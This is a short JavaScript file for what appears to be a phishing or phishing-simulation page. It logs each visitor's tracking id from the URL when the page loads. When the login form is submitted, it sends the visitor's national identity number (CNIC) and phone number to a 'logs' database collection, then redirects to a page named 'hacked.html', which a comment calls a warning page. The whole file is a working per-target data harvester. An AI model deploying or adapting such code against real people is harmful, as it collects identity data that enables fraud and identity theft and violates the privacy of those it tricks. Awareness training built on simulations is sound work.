// Get userId from URL
const params = new URLSearchParams(window.location.search);
const userId = params.get("id") || "unknown";

// Page load log
window.addEventListener("load", function () {
    db.collection("logs").add({
        userId: userId,
        action: "clicked",
        time: new Date()
    })
    .then(() => console.log("Click logged"))
    .catch(err => console.error(err));
});

// Form submit
document.getElementById("loginForm").addEventListener("submit", function(e) {
    e.preventDefault();

    const CNICValue = document.getElementById("userCNIC").value;
    const phoneValue = document.getElementById("userPhone").value;

    db.collection("logs").add({
        userId: userId,
        CNIC: CNICValue,
        PhoneNo: phoneValue,
        action: "submitted",
        time: new Date()
    })
    .then(() => console.log("Submit logged"))
    .catch(err => console.error(err));

    // 🔥 Redirect to warning page instead of alert
    window.location.href = "hacked.html";
});